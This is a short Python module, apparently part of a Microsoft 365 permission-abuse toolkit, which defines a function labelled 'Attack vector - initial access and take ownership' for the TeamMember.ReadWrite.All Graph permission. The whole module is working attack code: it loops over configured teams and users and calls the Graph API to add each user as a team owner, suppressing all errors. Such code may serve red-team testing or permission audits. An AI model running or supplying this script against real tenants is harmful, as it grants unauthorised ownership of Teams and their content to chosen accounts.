import requests
import colorama
from colorama import Fore, Style


def TeamMember_Vectors(request_headers, TeamsMemSettings):
    print()
    print(
        "TeamMember.ReadWrite.All - Add and remove members from teams, on behalf of the signed-in user. Also allows "
        "changing a member's role, for example from owner to non-owner.")

    print()
    try:
        print("Attack vector - initial access and take ownership")
        for team in TeamsMemSettings["teamNames"]:
            create_message_URL = "https://graph.microsoft.com/beta/teams/" + team + "/members"
            for user in TeamsMemSettings["users"]:

                message_obj = {
                    "@odata.type": "#microsoft.graph.aadUserConversationMember",
                    "roles": ["owner"],
                    "user@odata.bind": "https://graph.microsoft.com/v1.0/users('" + user + "')"
                }
                result = requests.post(create_message_URL, json=message_obj, headers=request_headers)

                if result.status_code == 201:
                    print(Fore.GREEN + "added user " + user + " to " + team)
                    print(Style.RESET_ALL)
    except:
        pass
